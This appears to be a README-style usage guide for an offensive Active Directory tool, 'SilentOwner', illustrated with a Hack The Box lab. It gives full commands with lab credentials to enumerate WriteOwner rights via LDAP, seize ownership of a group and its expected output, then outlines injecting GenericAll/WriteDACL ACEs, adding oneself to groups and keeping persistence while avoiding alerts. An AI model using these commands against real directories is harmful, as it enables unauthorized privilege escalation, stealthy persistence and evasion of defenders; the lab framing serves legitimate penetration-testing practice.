# 🧠 USAGE-STRATEGY.md — Maximize Privilege with Certipy-ACL + SilentOwner

SilentOwner is most effective **after** identifying a target object where you hold **WriteOwner** permissions. To achieve this, we recommend pairing it with [`certipy-acl`](https://github.com/xploitnik/certipy-acl), a stealth LDAP enumeration tool that filters ACEs by SID — letting you silently map real control paths without scanning noise.

---

## 🔗 Strategic Flow

```text
🎯 Start with low-priv LDAP creds → Enumerate SIDs → Find WriteOwner → Take Ownership → Inject ACEs (optional)
```

---

## 🔍 Step 1 — Use Certipy-ACL to Enumerate Real Permissions

(Certified HTB Case Study)

Start with any valid domain user:

```bash
python3 -m certipy_tool \
  -u 'judith.mader@certified.htb' \
  -p 'judith09' \
  -target certified.htb \
  -dc-ip 10.129.128.69 \
  --resolve-sids \
  --filter-sid S-1-5-21-729746778-2675978091-3820388244-1103
```

Look for entries like:

```text
[ACL] CN=Management,CN=Users,DC=certified,DC=htb
  [ACE] Type: ACCESS_ALLOWED, Mask: 0x80000, SID: S-1-5-21-...-1103
    [+] WriteOwner
```

This tells you:
- `judith.mader@certified.htb` has **WriteOwner** over the `Management` group.
- You can now proceed to take full ownership.

---

## 🛡️ Step 2 — Run SilentOwner to Assume Ownership

Once you find a target object, silently take over: 

```bash
python3 SilentOwner.py \
  --dc-ip 10.129.128.69 \
  -u judith.mader@certified.htb \
  -p 'judith09' \
  --domain certified.htb \
  --target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' \
  --new-owner-sid 'S-1-5-21-729746778-2675978091-3820388244-1103'
```

Expected output: Once you find a target object, silently take over: 

```text
[+] LDAP bind successful.
[DEBUG] Raw sd['OwnerSid']: b'...'
[+] Current owner: S-1-5-21-...-500
[+] Replacing owner with: S-1-5-21-...-1103
[✅] Ownership of CN=Management,CN=Users,DC=certified,DC=htb successfully changed
```

---

## 🔁 Step 3 — Optional Post-Ownership Control

Once you’re the owner of the object, you can:

- Inject custom ACEs (e.g., grant yourself `GenericAll`, `WriteDACL`, or `WriteMember`)
- Silently add yourself to groups
- Maintain stealthy persistence

> 🧪 A future companion script `inject_ace.py` will let you do this in a surgical, fully LDAP-based way.

---

## 🧩 Real-World Flow: (Certified HTB Case Study)

```text 
judith.mader (SID: ...1103)
│
└── ✅ WriteOwner over:
    CN=Management (SID: ...1104)
    │
    └── ✅ GenericWrite over:
        CN=management_svc (SID: ...1105)
        │
        └── ✅ GenericAll over:
            CN=ca_operator (SID: ...1106)
```

You control the top of the chain (Management), and from there, you can pivot silently through multiple privilege levels using SID awareness.

---

## 🧠 Why This Strategy Works

- **No Shell Needed** — All actions are done over LDAP.
- **No Graph Noise** — Unlike BloodHound, you see *only what matters*.
- **SID Precision** — You control the logic. You control the chain.
- **Stealth** — No scanning. No alerts. Just privilege.

---

## 📁 Suggested Repo Structure

```
SilentOwner/
├── SilentOwner.py
├── README.md
├── USAGE-STRATEGY.md  ← you are here
├── requirements.txt
└── .gitignore
```

---

## 🔐 Built to Empower SIDs — And the People Who Know How to Use Them.

